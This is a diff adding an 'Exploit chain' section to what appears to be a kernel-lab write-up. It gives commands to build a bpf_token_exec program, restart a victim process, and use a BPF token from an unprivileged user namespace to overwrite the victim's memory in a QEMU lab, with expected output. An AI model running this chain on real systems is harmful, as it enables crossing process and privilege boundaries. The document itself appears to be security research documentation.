@@ -422,3 +422,74 @@ BUF=BPFOKAAAAAAAAAAA
 ---
 
 <img width="955" height="269" alt="Screenshot 2026-05-03 023410" src="https://github.com/user-attachments/assets/62f82527-164c-4a55-956d-cf60bb6b23d7" />
+
+
+
+### Exploit chain:
+
+# BPF Token Exec Test
+ 
+Then on your host:
+ 
+```bash
+cd ~/kernel-lab/full-linux
+sudo mount -o loop ~/kernel-lab/rootfs.ext4 ~/kernel-lab/mnt
+ 
+sudo chroot ~/kernel-lab/mnt /bin/bash -c \
+  "apt update && apt install -y build-essential binutils"
+ 
+sudo chroot ~/kernel-lab/mnt /bin/bash -c \
+  "gcc -O2 -Wall /root/bpf_token_exec.c -o /root/bpf_token_exec"
+ 
+sudo sync
+sudo umount ~/kernel-lab/mnt
+```
+ 
+Then boot QEMU again and verify:
+ 
+```bash
+ls -l /root/bpf_token_exec
+```
+ 
+Also restart the victim before the token test, because your current victim is already modified:
+ 
+```bash
+killall victim 2>/dev/null || true
+/root/victim > /tmp/victim.log 2>&1 &
+sleep 2
+ 
+PID=$(awk -F= '/PID=/{print $2; exit}' /tmp/victim.log)
+ADDR=$(awk -F= '/ADDR=/{print $2; exit}' /tmp/victim.log)
+ 
+cp /root/tw_write_user /tmp/tw_write_user
+chmod 755 /tmp/tw_write_user
+chmod 644 /tmp/victim.log
+ 
+echo "PID=$PID ADDR=$ADDR"
+tail -n 5 /tmp/victim.log
+```
+ 
+You want to see fresh As before testing:
+ 
+```text
+BUF=AAAAAAAAAAAAAAAA
+```
+ 
+Then run the token proof:
+ 
+```bash
+/root/bpf_token_exec 1000 1000 /tmp/bpf-token /tmp/tw_write_user "$PID" "$ADDR"
+ 
+sleep 3
+tail -n 10 /tmp/victim.log
+```
+ 
+If it succeeds, the key evidence will be:
+ 
+```text
+[child] uid_map:          0       1000          1
+loader pid=... target pid=... target addr=...
+scheduled=... ran=... err=0
+BUF=BPFOKAAAAAAAAAAA
+```
+<img width="736" height="408" alt="image" src="https://github.com/user-attachments/assets/bf2e3bd9-76f0-41a9-934e-705b19fd65a4" />
